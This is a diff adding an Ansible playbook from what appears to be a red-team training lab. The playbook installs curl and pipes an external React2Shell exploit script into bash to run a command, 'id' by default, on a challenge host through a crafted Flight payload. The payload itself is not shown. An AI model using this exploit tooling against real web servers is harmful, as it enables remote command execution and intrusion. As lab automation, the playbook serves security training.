@@ -1,0 +1,26 @@
+---
+- name: Red Team | Run a command through React2Shell
+  hosts: red_team
+  gather_facts: false
+  vars:
+    react2shell_command: id
+  tasks:
+    - name: Ensure curl is available
+      become: true
+      vars:
+        walkthrough_caption: Install curl on the Red VM.
+      ansible.builtin.package:
+        name: curl
+        state: present
+
+    - name: Exploit React2Shell and print the command output
+      vars:
+        walkthrough_caption: Send the crafted Flight payload and show the command output from the challenge host.
+      ansible.builtin.shell:
+        cmd: >-
+          bash -s -- exploit
+          {{ target_url | mandatory('Set TARGET_URL in inventory/red_team/.env') | quote }}
+          {{ react2shell_command | quote }}
+        stdin: "{{ lookup('ansible.builtin.file', playbook_dir ~ '/../scripts/react2shell.sh') }}"
+        executable: /bin/bash
+      changed_when: false
